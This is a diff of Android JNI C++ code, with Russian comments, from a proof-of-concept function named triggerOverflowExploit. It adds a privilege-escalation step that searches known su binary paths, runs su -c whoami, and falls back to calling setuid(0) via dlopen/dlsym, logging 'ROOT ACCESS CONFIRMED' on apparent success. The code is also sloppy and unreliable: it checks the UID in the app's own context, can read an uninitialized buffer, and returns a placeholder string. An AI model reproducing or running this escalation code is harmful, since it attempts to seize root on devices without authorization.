@@ -83,43 +83,114 @@ Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, j
     LOGI("   File check:");
     real_system(check_cmd);
 
-    // Замени этот блок Step 7:
-    LOGI("Step 7: Attempting privilege escalation via 'su':");
+    // --- УМНЫЙ ПОИСК SU И Fallback НА SETUID ---
 
-    // Простая команда, где су запускается напрямую через system
-    int su_result = real_system("su -c 'whoami'");
+    LOGI("Step 7: Searching for 'su' and attempting escalation...");
 
-    if (su_result == 0) {
-        FILE* fp = popen("id -u", "r");
-        int uid = 0;
-        if (fp && fscanf(fp, "%d", &uid) == 1) {
+    const char* su_paths[] = {
+            "/system/bin/su",
+            "/sbin/su",
+            "/system/xbin/su",
+            "/data/local/tmp/su",
+            "/magisk/.core/busybox/su"
+    };
+
+    bool found_su = false;
+    char su_cmd[128] = "";
+
+    for (int i = 0; i < sizeof(su_paths)/sizeof(su_paths[0]); ++i) {
+        FILE* fp = popen(("test -f " + std::string(su_paths[i]) + " && echo FOUND").c_str(), "r"); // Проверка через test -f
+        char buf[64];
+        if (fp && fgets(buf, sizeof(buf), fp)) {
+            if (strstr(buf, "FOUND")) {
+                sprintf(su_cmd, "%s -c 'whoami'", su_paths[i]);
+                found_su = true;
+                LOGI("   Found su at: %s", su_paths[i]);
+                pclose(fp);
+                break;
+            }
+        } else if (fp) {
             pclose(fp);
-            LOGI("   UID from su: %d", uid);
-//            result_str = (uid == 0) ? "EXPLOIT FULLY WORKING: ROOT ACCESS CONFIRMED." :
-                         "Exploit ran, but su returned UID " + std::to_string(uid) + ".";
-            LOGI(">>> FINAL STATUS: + <result_str??dead(please_never_write_result_str_like_this)> + <<<");
+        }
+    }
+
+    int final_result = -1;
+
+    if (found_su) {
+        LOGI("   Executing: %s", su_cmd);
+        final_result = real_system(su_cmd);
+
+        FILE* fp_uid = popen("id -u", "r"); // Или используем su_cmd напрямую для проверки UID
+        int uid = 0;
+        if (fp_uid) {
+            char buf[32];
+            fgets(buf, sizeof(buf), fp_uid);
+            pclose(fp_uid);
+            for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
+            uid = atoi(buf);
+        }
+
+        LOGI("   UID after su: %d", uid);
+
+        if (uid == 0 || final_result == 0) {
+//            result_str = "SUCCESS: Found su and got ROOT.";
+            LOGI(">>> FINAL STATUS: ROOT ACCESS CONFIRMED <<<");
         } else {
-            if (fp) pclose(fp);
-//            result_str = "Exploit ran. 'su' command executed (code 0), but UID check failed.";
-            LOGW(">>> FINAL STATUS: SU EXECUTED, BUT CHECK FAILED <<<");
+//            result_str = "su found but returned UID=" + std::to_string(uid);
+            LOGW(">>> FINAL STATUS: SU FOUND BUT UID=%d <<<", uid);
         }
     } else {
-        LOGE("   Failed to execute 'su -c whoami'. Return code: %d", su_result);
-        // Проверяем, есть ли вообще su в системе
-        FILE* check_su = popen("which su", "r");
-        if (check_su) {
-            char path[64];
-            fgets(path, sizeof(path), check_su);
-            pclose(check_su);
-            LOGI("   'su' found at: %s", path);
-//            result_str = "'su' exists but returned code " + std::to_string(su_result) + ". Check permissions.";
-            LOGI("'su' exists but returned code std::to_string(su_result). Check permissions.");
+        // Fallback: пробуем напрямую вызвать setuid(0) через dlsym
+        LOGI("   No su found. Attempting direct 'setuid(0)' via dlsym...");
+
+        void* libc_handle = dlopen("libc.so", RTLD_NOW);
+        if (libc_handle) {
+            int (*real_setuid)(int) = (int (*)(int))dlsym(libc_handle, "setuid");
+
+            if (real_setuid) {
+                LOGI("   Found setuid() at: %p", (void*)real_setuid);
+
+                // Вызываем setuid(0) напрямую
+                int setuid_res = real_setuid(0);
+                LOGI("   setuid(0) returned: %d", setuid_res);
+
+                if (setuid_res == 0) {
+                    // Проверка текущего UID после setuid
+                    FILE* fp_check = popen("id -u", "r");
+                    int current_uid = 0;
+                    if (fp_check) {
+                        char buf[32];
+                        fgets(buf, sizeof(buf), fp_check);
+                        pclose(fp_check);
+                        for(int i=0; buf[i]; ++i) if(buf[i]=='\n'||buf[i]==' ') buf[i]=0;
+                        current_uid = atoi(buf);
+                    }
+
+                    LOGI("   UID after setuid(0): %d", current_uid);
+
+                    if (current_uid == 0) {
+//                        result_str = "SUCCESS: Direct setuid(0) worked! ROOT access.";
+                        LOGI(">>> FINAL STATUS: ROOT ACCESS VIA SETUID <<<");
+                    } else {
+//                        result_str = "setuid(0) succeeded but UID is still " + std::to_string(current_uid);
+                        LOGW(">>> FINAL STATUS: SETUID OK BUT UID=%d <<<", current_uid);
+                    }
+                } else {
+//                    result_str = "Direct setuid(0) failed. Error code: " + std::to_string(setuid_res);
+                    LOGE(">>> FINAL STATUS: SETUID FAILED (code %d) <<<", setuid_res);
+                }
+            } else {
+//                result_str = "No su found and dlsym('setuid') failed.";
+                LOGW(">>> FINAL STATUS: NO SU, NO SETUID <<<");
+            }
+            dlclose(libc_handle);
         } else {
-            LOGI("'su' command not found or failed to execute.");
-//            result_str = "'su' command not found or failed to execute.";
+//            result_str = "Failed to load libc.so for fallback.";
+            LOGE(">>> FINAL STATUS: LIBC LOAD FAILED <<<");
         }
-        LOGW(">>> FINAL STATUS: SU FAILED (code %d) <<<", su_result);
     }
+
+    // ----------------------------------------------------------
 
     free(buffer);
     return env->NewStringUTF(/*result_str.c_str()*/"xd");
